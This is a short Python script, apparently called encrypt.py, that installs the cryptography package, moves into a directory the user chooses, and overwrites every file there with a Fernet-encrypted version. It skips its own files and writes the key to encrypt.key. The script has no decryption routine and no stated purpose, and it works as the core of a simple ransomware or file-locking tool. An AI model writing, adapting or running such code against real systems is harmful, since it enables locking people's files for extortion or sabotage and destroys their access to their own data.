import os
import sys
import subprocess

subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])

from cryptography.fernet import Fernet

files = []
skip_files = ["encrypt.exe", "encrypt.py", "encrypt.key", "full_script.py"]

os.chdir("<path>") # <-- change path here

for file in os.listdir():
    if file in skip_files:
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("encrypt.key", "wb") as main_key:
    main_key.write(key)

for file in files:
    if file in skip_files:
        continue
    with open(file, "rb") as encr_file:
        content = encr_file.read()
    encrypted = Fernet(key).encrypt(content)
    with open(file, "wb") as encr_file:
        encr_file.write(encrypted)